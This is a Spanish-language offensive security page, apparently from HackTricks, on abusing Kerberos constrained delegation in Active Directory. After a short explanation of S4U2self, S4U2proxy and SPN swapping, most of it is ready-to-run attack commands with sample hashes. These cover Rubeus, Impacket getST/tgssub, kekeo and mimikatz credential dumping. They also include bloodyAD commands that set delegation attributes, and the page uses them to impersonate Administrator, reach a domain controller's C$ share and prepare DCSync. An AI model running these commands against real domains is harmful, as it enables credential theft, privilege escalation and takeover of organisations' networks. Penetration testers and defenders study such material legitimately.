# Constrained Delegation

{{#include ../../banners/hacktricks-training.md}}

## Constrained Delegation

Con esto, un administrador de dominio puede **permitir** que un equipo **suplante a un usuario o equipo** contra cualquier **servicio** de una máquina.

- **Service for User to self (_S4U2self_):** Cualquier **cuenta de servicio que posea un SPN** normalmente puede obtener un TGS para sí misma en nombre de un usuario arbitrario. Si la cuenta también tiene [TrustedToAuthForDelegation](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) (T2A4D) en _userAccountControl_, ese TGS es **forwardable**, lo que hace que la protocol transition sea directamente útil para la **constrained delegation clásica**.
- **Service for User to Proxy(_S4U2proxy_):** Una **cuenta de servicio** puede obtener un TGS en nombre de un usuario para los SPN incluidos en **msDS-AllowedToDelegateTo**. El evidence ticket utilizado en S4U2Proxy debe ser un ticket **forwardable** para el servicio que realiza la delegación: ya sea un ticket real de cliente a servicio capturado de la víctima o uno generado con **S4U2Self + T2A4D**.

**Nota**: Si un usuario está marcado como ‘_Account is sensitive and cannot be delegated_’ en AD, o es miembro de **Protected Users**, normalmente **no podrás suplantarlo** mediante constrained delegation. En dominios modernos, prioriza material **AES** frente a suposiciones basadas únicamente en RC4 al atacar cuentas con delegación habilitada.

Esto significa que, si **comprometes el hash del servicio**, puedes **suplantar usuarios** y obtener **acceso** en su nombre a cualquier **servicio** en las máquinas indicadas (posible **privesc**).

Además, **no solo tendrás acceso al servicio que el usuario puede suplantar, sino también a cualquier servicio**, porque el SPN (el nombre del servicio solicitado) no se comprueba (en el ticket, esta parte no está cifrada ni firmada). Por lo tanto, si tienes acceso al **servicio CIFS**, también puedes tener acceso al **servicio HOST** utilizando, por ejemplo, el flag `/altservice` de Rubeus. La misma debilidad de intercambio de SPN es aprovechada por **Impacket getST -altservice** y otras herramientas.

Además, el acceso al **servicio LDAP en un DC** es lo necesario para explotar un **DCSync**.
```bash:Enumerate
# Powerview
Get-DomainUser -TrustedToAuth | select userprincipalname, name, msds-allowedtodelegateto
Get-DomainComputer -TrustedToAuth | select userprincipalname, name, msds-allowedtodelegateto

#ADSearch
ADSearch.exe --search "(&(objectCategory=computer)(msds-allowedtodelegateto=*))" --attributes cn,dnshostname,samaccountname,msds-allowedtodelegateto --json
```

```bash:Linux / LDAP enumeration
# NetExec: enumerate constrained / unconstrained / RBCD in one shot
nxc ldap dc.corp.local -u user -p 'Password123!' --find-delegation

# bloodyAD / msldap: LDAP-first enumeration from Linux
bloodyAD -H dc.corp.local -d corp.local -u user -p 'Password123!' msldap constrained
bloodyAD -H dc.corp.local -d corp.local -u user -p 'Password123!' msldap s4u2proxy
```
**Nota del operador:** no confíes únicamente en las capturas de pantalla de **ADUC** o BloodHound para revisar **gMSA/sMSA**. Esas cuentas suelen ocultar la pestaña habitual **Delegation**, así que enumera directamente los atributos sin procesar **`userAccountControl`** y **`msDS-AllowedToDelegateTo`**.
```bash:Quick Way
# Generate TGT + TGS impersonating a user knowing the hash
Rubeus.exe s4u /user:sqlservice /domain:testlab.local /rc4:2b576acbe6bcfda7294d6bd18041b8fe /impersonateuser:administrator /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /altservice:ldap /ptt
```
### Transición de protocolo frente a delegación restringida solo Kerberos

Si la cuenta comprometida tiene **T2A4D**, normalmente puedes completar toda la cadena **`S4U2Self -> S4U2Proxy`** usando únicamente la clave del servicio/TGT.<sup>[[2]](#references)</sup>

Si solo tiene **`msDS-AllowedToDelegateTo`** (el modo clásico **"Use Kerberos only"**), la delegación aún puede abusarse, pero el ticket de evidencia para S4U2Proxy debe ser un **ticket real y forwardable de usuario a servicio** para el servicio delegante. En la práctica, esto significa robar o capturar un TGS de la víctima desde **LSASS/ccache** y pasarlo a la segunda fase (`/tgs:` en Rubeus). Un ticket S4U2Self **non-forwardable** no es suficiente para la delegación restringida clásica; si ese es tu único ticket de evidencia, consulta [Resource-based Constrained Delegation](resource-based-constrained-delegation.md).<sup>[[2]](#references)</sup>

### Notas sobre la delegación restringida entre dominios (2025+)

Desde **Windows Server 2012/2012 R2**, el KDC admite la delegación restringida entre dominios/forests mediante extensiones de S4U2Proxy. Las versiones modernas (Windows Server 2016–2025) mantienen este comportamiento y añaden dos SIDs de PAC para indicar la transición de protocolo:<sup>[[1]](#references)</sup>

- `S-1-18-1` (**AUTHENTICATION_AUTHORITY_ASSERTED_IDENTITY**) cuando el usuario se autenticó normalmente.
- `S-1-18-2` (**SERVICE_ASSERTED_IDENTITY**) cuando un servicio afirmó la identidad mediante la transición de protocolo.

Espera encontrar `SERVICE_ASSERTED_IDENTITY` dentro del PAC cuando se utiliza la transición de protocolo entre dominios, lo que confirma que el paso S4U2Proxy se completó correctamente.<sup>[[1]](#references)</sup>

### Herramientas de Impacket / Linux (altservice y full S4U)

Las versiones recientes de Impacket (0.11.x+) exponen la misma cadena S4U y el cambio de SPN que Rubeus:<sup>[[2]](#references)</sup>
```bash
# Get TGT for delegating service (hash/aes)
getTGT.py contoso.local/websvc$ -hashes :8c6264140d5ae7d03f7f2a53088a291d

# S4U2self + S4U2proxy in one go, impersonating Administrator to CIFS then swapping to HOST
getST.py -spn CIFS/dc.contoso.local -altservice HOST/dc.contoso.local \
-impersonate Administrator contoso.local/websvc$ \
-hashes :8c6264140d5ae7d03f7f2a53088a291d -k -dc-ip 10.10.10.5

# Inject resulting ccache
export KRB5CCNAME=Administrator.ccache
smbclient -k //dc.contoso.local/C$ -c 'dir'

# If you already have a ticket/ccache for the right host, rewrite only the service class offline
# (same SPN-swapping idea as Rubeus /altservice)
tgssub.py -in Administrator.ccache -out Administrator_HOST.ccache -altservice host/dc.contoso.local
export KRB5CCNAME=Administrator_HOST.ccache
```
Si prefieres falsificar primero el ST del usuario (p. ej., solo con un hash offline), combina **ticketer.py** con **getST.py** para S4U2Proxy. **tgssub.py** también resulta útil cuando ya tienes un ccache funcional y solo necesitas cambiar la clase de servicio para el mismo host. Consulta el issue abierto de Impacket #1713 para conocer las peculiaridades actuales (KRB_AP_ERR_MODIFIED cuando el ST falsificado no coincide con la clave del SPN).<sup>[[2]](#references)</sup>

### Automatización de la configuración de delegación desde credenciales con pocos privilegios

Si ya tienes **GenericAll/WriteDACL** sobre un equipo o una cuenta de servicio, puedes establecer remotamente los atributos necesarios sin RSAT usando **bloodyAD** (2024+):
```bash
# Set TRUSTED_TO_AUTH_FOR_DELEGATION and point delegation to CIFS/DC
KRB5CCNAME=owned.ccache bloodyAD -d corp.local -k --host dc.corp.local add uac WEBSRV$ -f TRUSTED_TO_AUTH_FOR_DELEGATION
KRB5CCNAME=owned.ccache bloodyAD -d corp.local -k --host dc.corp.local set object WEBSRV$ msDS-AllowedToDelegateTo -v 'cifs/dc.corp.local'
```
Esto permite construir una ruta de constrained delegation para privesc sin privilegios de DA en cuanto puedas escribir esos atributos.

- Paso 1: **Obtener el TGT del servicio permitido**
```bash:Get TGT
# The first step is to get a TGT of the service that can impersonate others
## If you are SYSTEM in the server, you might take it from memory
.\Rubeus.exe triage
.\Rubeus.exe dump /luid:0x3e4 /service:krbtgt /nowrap

# If you are SYSTEM, you might get the AES key or the RC4 hash from memory and request one
## Get AES/RC4 with mimikatz
mimikatz sekurlsa::ekeys

## Request with aes
tgt::ask /user:dcorp-adminsrv$ /domain:sub.domain.local /aes256:babf31e0d787aac5c9cc0ef38c51bab5a2d2ece608181fb5f1d492ea55f61f05
.\Rubeus.exe asktgt /user:dcorp-adminsrv$ /aes256:babf31e0d787aac5c9cc0ef38c51bab5a2d2ece608181fb5f1d492ea55f61f05 /opsec /nowrap

# Request with RC4
tgt::ask /user:dcorp-adminsrv$ /domain:sub.domain.local /rc4:8c6264140d5ae7d03f7f2a53088a291d
.\Rubeus.exe asktgt /user:dcorp-adminsrv$ /rc4:cc098f204c5887eaa8253e7c2749156f /outfile:TGT_websvc.kirbi
```
> [!WARNING]
> Hay **otras formas de obtener un ticket TGT** o el **RC4** o **AES256** sin ser SYSTEM en el equipo, como Printer Bug y unconstrain delegation, NTLM relaying y Active Directory Certificate Service abuse
>
> **Con solo tener ese ticket TGT (o su hash), puedes realizar este ataque sin comprometer todo el equipo.**

- Step2: **Obtener el TGS para el servicio suplantando al usuario**
```bash:Using Rubeus
# Obtain a TGS of the Administrator user to self
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /impersonateuser:Administrator /outfile:TGS_administrator

# Obtain service TGS impersonating Administrator (CIFS)
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /tgs:TGS_administrator_Administrator@DOLLARCORP.MONEYCORP.LOCAL_to_websvc@DOLLARCORP.MONEYCORP.LOCAL /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /outfile:TGS_administrator_CIFS

#Impersonate Administrator on different service (HOST)
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /tgs:TGS_administrator_Administrator@DOLLARCORP.MONEYCORP.LOCAL_to_websvc@DOLLARCORP.MONEYCORP.LOCAL /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /altservice:HOST /outfile:TGS_administrator_HOST

# Get S4U TGS + Service impersonated ticket in 1 cmd (instead of 2)
.\Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /user:dcorp-adminsrv$ /ticket:TGT_websvc.kirbi /nowrap

#Load ticket in memory
.\Rubeus.exe ptt /ticket:TGS_administrator_CIFS_HOST-dcorp-mssql.dollarcorp.moneycorp.local
```

```bash:kekeo + Mimikatz
#Obtain a TGT for the constrained-delegation user
tgt::ask /user:dcorp-adminsrv$ /domain:dollarcorp.moneycorp.local /rc4:8c6264140d5ae7d03f7f2a53088a291d

#Get a TGS for the service you are allowed (in this case time) and for other one (in this case LDAP)
tgs::s4u /tgt:TGT_dcorpadminsrv$@DOLLARCORP.MONEYCORP.LOCAL_krbtgt~dollarcorp.moneycorp.local@DOLLAR CORP.MONEYCORP.LOCAL.kirbi /user:Administrator@dollarcorp.moneycorp.local /service:time/dcorp-dc.dollarcorp.moneycorp.LOCAL|ldap/dcorpdc.dollarcorp.moneycorp.LOCAL

#Load the TGS in memory
Invoke-Mimikatz -Command '"kerberos::ptt TGS_Administrator@dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL_ldap~ dcorp-dc.dollarcorp.moneycorp.LOCAL@DOLLARCORP.MONEYCORP.LOCAL_ALT.kirbi"'
```
[**Más información en ired.team.**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-kerberos-constrained-delegation) y [**https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61**](https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61)<sup>[[3]](#references)[[4]](#references)</sup>

## References

- [1] [Descripción general de Kerberos Constrained Delegation (Microsoft Learn, 2025)](https://learn.microsoft.com/en-us/windows-server/security/kerberos/kerberos-constrained-delegation-overview)
- [2] [Abusing Delegation with Impacket (Part 2): Constrained Delegation (Black Hills, 2025)](https://www.blackhillsinfosec.com/abusing-delegation-with-impacket-part-2/)
- [3] [Kerberos Constrained Delegation (ired.team)](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-kerberos-constrained-delegation)
- [4] [Kerberosity Killed the Domain: An Offensive Kerberos Overview (SpecterOps)](https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61)
{{#include ../../banners/hacktricks-training.md}}
